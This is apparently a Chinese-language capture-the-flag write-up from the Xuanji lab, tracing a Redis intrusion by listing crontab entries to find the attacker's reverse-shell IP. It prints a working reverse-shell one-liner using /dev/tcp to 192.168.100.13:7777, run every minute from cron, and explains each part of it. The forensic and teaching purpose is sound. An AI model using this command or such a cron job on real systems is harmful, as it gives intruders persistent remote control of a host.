### Redis 日志分析反弹 Shell IP

话不多说，直接上题（玄机靶场）

![](https://pic1.imgdb.cn/item/681d74d158cb8da5c8e7ba54.png)

题目让我们找到黑客反弹 shell 的 IP 是啥作为 flag 进行提交

那我们可以查看一下当前用户的定时任务那一些，如果黑客通过定时任务进行持久化攻击，他们可能会在 crontab 中留下定时执行的恶意脚本、命令或反弹 shell 的配置

因此，通过检查 `crontab -l`，很可能会发现黑客设置的定时任务，从而找到恶意活动的迹象，那就试试呗

```sh
crontab -l
```

![](https://pic1.imgdb.cn/item/681d995458cb8da5c8e869cb.png)

这个定时任务每分钟执行一次

```sh
/bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1
```

- `-i` 选项表示启动一个交互式 shell
- `>& /dev/tcp/192.168.100.13/7777` 使用 Bash 的网络重定向特性，将标准输出和标准错误重定向到 `192.168.100.13` 的 7777 端口
- `0>&1` 表示将标准输入重定向到标准输出

这种命令通常用于创建一个反向 shell，也称为反弹 shell

通过这种方式，黑客可以在目标主机上获得一个远程 shell 访问权限，并能够执行任意命令

